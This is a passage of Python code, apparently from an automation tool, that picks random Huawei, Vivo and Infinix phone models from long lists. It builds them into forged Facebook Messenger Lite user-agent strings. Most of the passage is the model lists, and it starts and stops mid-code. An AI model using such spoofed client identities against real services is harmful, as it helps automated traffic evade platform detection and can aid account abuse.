'HUAWEI-S7', 'HUAWEI-S7', 'S8600', 'S8600', 'S8600', 'HUAWEI S9', 'HUAWEI ATH-UL01', 'HUAWEI ATH-UL06', 'KANT-360', 'KANT-360S', 'LEO-BX9', 'LEO-DLXXE', 'HUAWEI T1 7.0', 'B988', 'ZT-10013G', 'B988', 'B988', 'HUAWEI T8100', 'HUAWEI T8500', 'HUAWEI T8600', 'T8620', 'T8620', 'T8620', 'T8830Pro', 'T8830Pro', 'T8830Pro', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI_T8951', 'HUAWEI_T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'T9200', 'T9200', 'T9200', 'HUAWEI-U20', 'HUAWEI U8120', 'U8180', 'U8180', 'U8180', 'MegaFon U8180', 'Kyivstar Terra', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8230', 'U8220/U8230', 'HuaweiU8300', 'U8350', 'U8350', 'GM FOX', 'U8350', 'Barcelona', 'U8350', 'U8350', 'U8350', 'U8350', 'U8350-51', 'U8350', 'U8350', 'U8350', 'U8350-51', 'Personal U8350', 'U8350', 'U8350', 'U8350', 'U8350', 'MF8503', 'ICE', 'MF8503', 'MF8503', 'HuaweiU8500', 'HuaweiU8510', 'S41HW', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'Huawei u8650', 'Huawei u8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650-1', 'U8650-1', 'U8650', 'MTC 955', 'U8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'Prism', 'Prism', 'Prism', 'U8651T', 'Prism', 'U8651T', 'U8651T', 'Prism', 'U8652', 'Huawei-U8652', 'U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Android 2.3.5', 'U8655-51', 'U8655-1', 'U8655-1', 'U8655-1', 'MTC 965', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'Etisalat', 'U8655-1', 'U8655-1', 'U8655-51', 'U8655-1', 'U8660', 'SONIC', 'HUAWEI U8661', 'HUAWEI_U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'GT-19100', 'U8666-1', 'U8666-1', 'U8666-1', 'MTC Fit', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-51', 'U8666-1', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'T-MobilemyTouch', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'Prism II', 'Prism II', 'Prism II', 'Prism II', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Ucell', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8815-51', 'U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'Galaxy S5', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'MTC Viva', 'HUAWEI U8816', 'U8816', 'MTC Viva', 'U8816', 'U8816', 'U8820', 'U8820', 'U8820', 'U8820', 'U8820', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'U8832D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'HUAWEI-U8850', 'U8860-51', 'HUAWEI_U8860', 'U8867Z', 'U8867Z', 'U8867Z', 'Huawei U8900', 'HUAWEI U8950', 'HUAWEI U8950D', 'Oppo F9D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8951', 'Huawei-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', '201HW', '201HW', '201HW', '201HW', 'U9500E', 'HW-01E', 'HW-01E', 'HW-01E', 'HW-01E', 'HUAWEI U9510', 'Huawei/U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI_U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'UM840', 'UM840', 'UM840', 'KANT-359', 'KANT-369', 'HUAWEI WATCH', 'ARS-L22', 'ARS-TL00', 'ARS-AL00', 'ARS-L22', 'Huawei Y221', 'Huawei y221', 'Huawei Y3 2017', 'CRO-U00', 'CRO-L22', 'CAG-L02', 'CAG-L22', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI_Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A2', 'Huawei Y301A2', 'Huawei Y301A2', 'HuaweiY301A2', 'Huawei Y320', 'Huawei Y320', 'Huawei Y320', 'Huawei Y330', 'Huawei Y330', 'HUAWEI Y330-U01', 'HUAWEI Y336-U02', 'Huawei Y360', 'HUAWEI Y360', 'HUAWEI LUA-L21', 'HUAWEI LUA-U22', 'MYA-L22', 'MYA-L23', 'MYA-U29', 'DRA-L21', 'DRA-LX3', 'DRA-L01', 'U', 'AMN-LX9', 'AMN-LX2', 'AMN-LX3', 'HUAWEI AMN-LX9', 'AMN-LX1', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'CRO-L23', 'CRO-L03', 'CRO-L03', 'CAG-L03', 'CAG-L23', 'DRA-LX2', 'MYA-L13', 'HUAWEI Y511', 'Huawei Y520', 'HUAWEI Y520', 'HUAWEI Y536A1', 'HUAWEI Y550', 'HUAWEIY560', 'Huawei Y5C', 'HUAWEI CUN-L22', 'HUAWEI CUN-U29', 'HUAWEI CUN-L21', 'HUAWEI CUN-L01', 'DRA-LX9', 'DRA-LX9', 'DRA-LX9', 'HUAWEI SCL-U31', 'HUAWEI SCC-U21', 'MYA-L11', 'MYA-L41', 'ATU-L22', 'ATU-L21', 'MRD-LX3', 'MRD-LX1', 'MRD-LX1F', 'MRD-LX1N', 'MRD-LX3', 'ATU-L31', 'TIT-L01', 'HUAWEI TIT-L01', 'HUAWEI TIT-AL00', 'MRD-LX2', 'Kavak Y625-U03', 'Y635-L03', 'Y635-L01', 'HUAWEI Y635-L03', 'Y635-L02', 'Y635-L21', 'Y635-L21', 'CAM-L21', 'HUAWEI CAM-L21', 'CAM-L23', 'CAM-L03', 'MED-LX9', 'MED-LX9N', 'H1711z', 'TRT-LX3', 'TRT-LX1', 'LDN-L01', 'LDN-LX3', 'LDN-L01', 'DUB-LX3', 'DUB-LX1', 'LDN-L21', 'LDN-L21', 'LDN-L21', 'TRT-L21A', 'LDN-LX2', 'DUB-LX2', 'DUB-AL20', 'PPA-LX3', 'Peppa-L23B', 'ART-L28', 'AQM-LX1', 'AQM-LX1', 'FLA-LX3', 'FLA-LX2', 'FLA-LX1', 'FLA-AL20', 'FLA-TL10', 'JKM-LX1', 'JKM-LX2', 'JKM-AL00b', 'JKM-AL00a', 'JKM-LX3', 'STK-L21', 'STK-L22', 'STK-LX3', 'FRL-L23', 'FRL-L22', 'FRL-L22'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Huawei;FBBD/Huawei;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Vivo" in str(self.device):
                self.android_model = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Vivo;FBBD/Vivo;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Infinix" in str(self.device):
                self.android_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 